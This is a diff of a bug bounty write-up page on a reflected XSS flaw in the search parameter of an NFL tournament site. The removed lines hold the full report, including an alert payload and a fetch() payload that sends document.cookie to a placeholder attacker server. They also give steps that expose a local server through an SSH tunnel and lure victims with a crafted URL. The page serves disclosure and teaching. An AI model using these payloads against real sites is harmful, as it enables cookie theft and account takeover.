@@ -1,125 +1,43 @@
 ---
-layout: null
----
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NFL: Reflected XSS | ConnorDev</title>
-    <link rel="stylesheet" href="../../../assets/css/styles.css">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
-</head>
-<body>
-<div class="container submission-body">
-<article class="bounty-report">
-
-# NFL: Reflected XSS in URL Search Query Parameter
-
-[Español (ES)](../../../es/bounties/nfl-xss-search-query/)
-
-## Introduction
-
-This report documents a **Reflected Cross-Site Scripting (XSS)** vulnerability discovered on the NFL's public-facing domain `hbcutournament.nfl.com`. The vulnerability resides in the search results page parameter, which improperly processes user-supplied input without adequate sanitization, allowing for the execution of arbitrary JavaScript code.
-
+layout: default
 ---
 
-## 🔍 Search Testing
+<div class="container">
+<article>
+  <div class="lang-switcher">
+    <a href="../../../es/bounties/nfl-xss-search-query/" class="lang-btn">Español (ES)</a>
+    <a href="./" class="lang-btn active">English (EN)</a>
+  </div>
 
-The first step was testing for reflection in the search functionality on the following endpoints:
+  <div class="bounty-header">
+    <h1>NFL: Reflected XSS Search Query</h1>
+    <p>Discovering and exploiting unescaped search parameters on the National Football League's digital assets.</p>
+  </div>
 
-```html
-https://hbcutournament.nfl.com/resources?q=
-https://hbcutournament.nfl.com/blogs?q=
-```
+  <div class="bounty-content">
+    <h2>🔍 Vulnerability Research</h2>
+    <p>Testing for reflection on <code>hbcutournament.nfl.com</code> revealed that input via the <code>?q=</code> parameter was directly rendered into the DOM without sanitization.</p>
+    
+    <p><code>https://hbcutournament.nfl.com/resources?q=</code></p>
+    
+    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png" alt="HTML Injection Confirm">
 
-I observed that the application does not properly sanitize or encode input passed via the `?q=` URL fragment, allowing for injection into the browser context.
+    <h2>🚨 XSS Vector Execution</h2>
+    <p>Arbitrary JS execution was achieved using <code>img</code> tags without a source, triggering the <code>onerror</code> event handler.</p>
+    
+    <pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
 
----
+    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png" alt="XSS Trigger">
 
-## 🏗️ HTML Injection
+    <h2>🚀 Critical Data Exfiltration</h2>
+    <p>By chaining the XSS with <code>fetch()</code>, I successfully exfiltrated <code>document.cookie</code> data to an attacker-controlled server, demonstrating high impact session takeover potential.</p>
+    
+    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png" alt="Cookie Hijacking">
 
-To confirm the vulnerability, I first attempted a simple HTML injection to see if the input was rendered directly in the DOM.
+    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png" alt="Server Logs Received">
 
-**Payload:**
-```HTML
-<h1>This is a HTML Injection test</h1> --- This is a normal text.
-```
-
-![NFL HTML Injection](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png)
-
-The result confirmed that the application was rendering raw HTML tags provided via the URL parameter.
-
----
-
-## 🚨 First Alert (Reflected XSS)
-
-After confirming HTML injection, I moved to JavaScript execution. After testing several vectors, I discovered that the `<img>` tag effectively triggers execution via the `onerror` event.
-
-**Payload:**
-```HTML
-<img/src/onerror=alert(8)>
-```
-
-**Malicious URL:**
-`https://hbcutournament.nfl.com/resources?q=<img/src/onerror=alert(8)>`
-
-![NFL Alert 1](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png)
-
----
-
-## 🚀 Final Exploit (Cookies Exfiltration)
-
-The final goal was to demonstrate a critical impact. I crafted a payload to exfiltrate session cookies to an attacker-controlled server.
-
-**Payload:**
-```html
-<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>
-```
-
-By tricking an authenticated user into clicking this link, an attacker could steal their session cookies and achieve account takeover.
-
-![NFL Cookies Exfiltration](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png)
-
-The exfiltrated cookies were successfully received on the attacker's server:
-
-![NFL Cookies Exfiltration Result](../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png)
-
----
-
-## 🎯 Steps to Reproduce
-
-1. **Start a Local Web Server**:
-   ```bash
-   python3 -m http.server 8000
-   ```
-
-2. **Expose the Server (e.g., via Serveo)**:
-   ```bash
-   ssh -R 80:localhost:8000 serveo.net
-   ```
-
-3. **Construct the Malicious URL**:
-   Replace `YOUR-WEB-SERVER` with the generated public URL in the payload:
-   `https://hbcutournament.nfl.com/resources?q=<img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))>`
-
-4. **Victim Interaction**:
-   When an authenticated user visits the URL, their cookies are sent to the attacker's server.
-
----
-
-## 🤝 Collaboration Detail
-
-This research was conducted in a **50/50 collaboration** between **{{ site.researchers.ivan.name }}** and **{{ site.researchers.diego.name }}**. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.
-
----
-
-## 🏁 Researchers & Contact
-
-**{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
-**{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
-
+    <h2>🤝 Collaboration Detail</h2>
+    <p>This research was conducted in a 50/50 collaboration between {{ site.researchers.ivan.name }} and {{ site.researchers.diego.name }}.</p>
+  </div>
 </article>
 </div>
-</body>
-</html>
